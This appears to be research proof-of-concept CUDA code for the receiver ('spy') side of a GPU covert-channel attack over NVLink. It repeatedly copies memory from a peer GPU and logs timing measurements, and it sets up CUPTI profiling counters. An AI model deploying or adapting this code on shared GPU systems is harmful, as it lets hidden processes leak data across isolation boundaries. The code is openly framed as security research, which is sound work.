/*
* Author: Yicheng Zhang
* Association: UC Riverside
* Date: Oct 3, 2023
*
* Description: Receiver for covert-channel attack
* Idea of program: use simple kernel to force memcpy from remote gpu to local gpu.
* At the same time, use cupti_profiler to print out counters collected during kernel executions. 
* The value of d_local, d_remote vector are set to be 1 and 100.
* Three input value for this program: local gpu ID, remote gpu ID and profile gpu ID.
*/


#include <vector>
#include <cuda_profiler_api.h> // For cudaProfilerStart() and cudaProfilerStop()
#include <cstdio>
#include <string>
#include <thrust/device_vector.h>
#include <fstream>
#include <cupti_profiler.h>
#include <time.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdio.h>
#include "cuda_runtime.h"
#include "device_launch_parameters.h"
#include <stdlib.h>
#include "kernel.cu"
#include <iostream>
#include <chrono>
#include <thread>




 
int main(int argc, char **argv) {

    using namespace std;
    int local=0; 
    int remote=1;
    int profile=0;
    int sizeElement;
    int *h_local, *h_remote;
    int *d_local, *d_remote;
    // Create CUDA events
    cudaEvent_t start, stop;
    cudaEventCreate(&start);
    cudaEventCreate(&stop);
    
    struct timeval ts,te;

    local = atoi(argv[1]);
    remote = atoi(argv[2]);
    profile = atoi(argv[3]);
    char *ctr_num = argv[4];
    sizeElement = atoi(argv[5]); // Transfer size is 256 bytes = 1 nvlink packet
    // sizeElement = 1048576; // Transfer size is 4 MB
    // printf("%d\n", sizeElement);

    size_t size = sizeElement * sizeof(int);

    // set up profiler
    cudaSetDevice(profile);
    CUdevice device;

	DRIVER_API_CALL(cuInit(0));  
	// Initialize the CUDA driver API Initializes the driver API and must be called before any other function from the driver API in the current process. Currently, the Flags parameter must be 0. If cuInit() has not been called, any function from the driver API will return CUDA_ERROR_NOT_INITIALIZED.
	DRIVER_API_CALL(cuDeviceGet(&device, profile));
	// Returns a handle to a compute device.

    // define ctrs to profile
	#if PROFILE_ALL_EVENTS_METRICS
	const auto event_names = cupti_profiler::available_events(device);
	const auto metric_names = cupti_profiler::available_metrics(device);
	#else
	vector<string> event_names {        
               
	};
	vector<string> metric_names {
    ctr_num
	// "l2_read_transactions",// works
	//"nvlink_data_receive_efficiency",
	// "nvlink_data_transmission_efficiency",
	//"nvlink_overhead_data_received",
	//"nvlink_overhead_data_transmitted",
	//"nvlink_receive_throughput",
	// "nvlink_total_data_received",// works
	//"pcie_total_data_received",
	// "nvlink_total_data_transmitted",// works
	//  "nvlink_total_nratom_data_transmitted" , // works
	// "nvlink_total_ratom_data_transmitted" ,
	//  "nvlink_total_response_data_received" ,// works
	// "nvlink_total_write_data_transmitted",
	// "nvlink_transmit_throughput", //works
	// "nvlink_user_data_received",
	// "nvlink_user_data_transmitted",
	// "nvlink_user_nratom_data_transmitted" ,
	// "nvlink_user_ratom_data_transmitted",
	// "nvlink_user_response_data_received",
	// "nvlink_user_write_data_transmitted",

	// "l2_write_transactions",  // error
	//"dram_read_transactions",
	//"dram_write_transactions",

						
	};

  
  	#endif
	CUcontext context;
	cuCtxCreate(&context, 0, profile); // context is created on device # profile
	//Parameters
	// pctx
	// - Returned context handle of the new context
	// flags
	// - Context creation flags
	// dev
	// - Device to create context on


    // Allocate input vectors in host memory
    h_local = (int*)malloc(size);
    h_remote = (int*)malloc(size);

    // Initialize input vectors, local sets to be 1, remote set to be 100
    initVec(h_local, sizeElement, 1);
    initVec(h_remote, sizeElement, 100);

    // local GPU contains d_local
    cudaSetDevice(local);
    cudaMalloc((void**)&d_local, size);  

    // remote GPU contains d_remote 
    cudaSetDevice(remote);
    cudaMalloc((void**)&d_remote, size);

    // make sure nvlink connection exists between src and det device.
    cudaSetDevice(remote); // Set local device to be used for GPU executions.
    cudaDeviceEnablePeerAccess(local, 0);  // Enables direct access to memory allocations on a peer device.
    cudaSetDevice(local); // Set local device to be used for GPU executions.
    cudaDeviceEnablePeerAccess(remote, 0);  // Enables direct access to memory allocations on a peer device.

    // Copy vector local from host memory to device memory
    cudaMemcpy(d_local, h_local, size, cudaMemcpyHostToDevice);
    cudaDeviceSynchronize();

    // Copy vector remote from host memory to device memory
    cudaMemcpy(d_remote, h_remote, size, cudaMemcpyHostToDevice);
    cudaDeviceSynchronize();

    int blockSize = 32;
    int gridSize = (sizeElement + blockSize - 1) / blockSize;

    
    // synchronization: spy sigbal back to trojan by sending same size of data 
    // and let trojan know it is ready to receive
    
    // start cupti profiler   
    // cupti_profiler::profiler *p= new cupti_profiler::profiler(event_names, metric_names, context);

    for(int j = 0; j < 10000000000; j++){

        gettimeofday(&ts,NULL);
        // Record the start event
        cudaEventRecord(start, 0);

        // kernel execution
        test_nvlink <<<gridSize, blockSize>>>(d_remote, d_local, sizeElement); 
        cudaDeviceSynchronize();

        // Record the stop event
        cudaEventRecord(stop, 0);

        // Wait for the stop event to complete
        cudaEventSynchronize(stop);

        // Calculate the elapsed time in milliseconds
        float milliseconds;
        cudaEventElapsedTime(&milliseconds, start, stop);

        std::cout   << size
        << "," 
        << ts.tv_sec*1000000 + ts.tv_usec
        // << ","
        // << te.tv_sec*1000000 + te.tv_usec
        << "," 
        << milliseconds * 1000 
        ;
        printf("\n"); 
        
        

    }
    // free(p);


    // Copy back to host memory 
    cudaMemcpy(h_remote, d_remote, size, cudaMemcpyDeviceToHost); 
    cudaMemcpy(h_local, d_local, size, cudaMemcpyDeviceToHost); 
    cudaDeviceSynchronize();
   
    double mb = sizeElement * sizeof(int) / (double)1e6;
    printf("Size of data transfer (MB): %f\n", mb);
    printf("Vector V_local (original value = 1): %d\n",h_local[sizeElement-1]);
    printf("Vector V_remote (original value = 100): %d\n",h_remote[sizeElement-1]);


    std::cout   << size
    << "," 
    << ts.tv_sec*1000000 + ts.tv_usec
    << "," 
    << (te.tv_sec - ts.tv_sec) * 1000000 + (te.tv_usec - ts.tv_usec)
    ;
    printf("\n");  

    cudaFree(d_local);
    cudaFree(d_remote);
    free(h_local);
    free(h_remote);
    

    // exit(EXIT_SUCCESS);
 }
 
